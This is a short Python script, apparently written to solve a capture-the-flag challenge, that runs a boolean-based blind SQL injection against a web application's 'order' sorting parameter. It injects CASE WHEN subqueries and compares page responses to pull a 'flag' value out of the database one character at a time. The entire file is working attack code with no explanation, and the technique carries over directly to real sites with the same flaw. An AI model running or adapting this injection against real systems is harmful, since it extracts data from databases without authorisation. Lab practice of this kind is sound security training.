import requests

MACHINE_IP = ""
if MACHINE_IP == "":
  MACHINE_IP = str(input("Machine IP: "))

url = f"http://{MACHINE_IP}//?order="

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-$!:*&%{}()"


title_req_text = requests.get(url=url+'title').text
date_req_text = requests.get(url=url+'date').text
flag =""

counter = 1

key = True

while key:
    for i in chars:
        query = f"(CASE WHEN (SELECT SUBSTRING(flag,1,{counter}) from flag)='{flag+i}' THEN title ELSE date END)"
        req = requests.get(url=url+query).text
        if req == title_req_text:
            flag = flag+i
            counter+=1
            break
        elif req == date_req_text:
            pass
        else:
            print('error')
        if i == ")":
            print("[-] Data could not be extracted beyond!")
            key = False
    print(f"Flag is: {flag}")
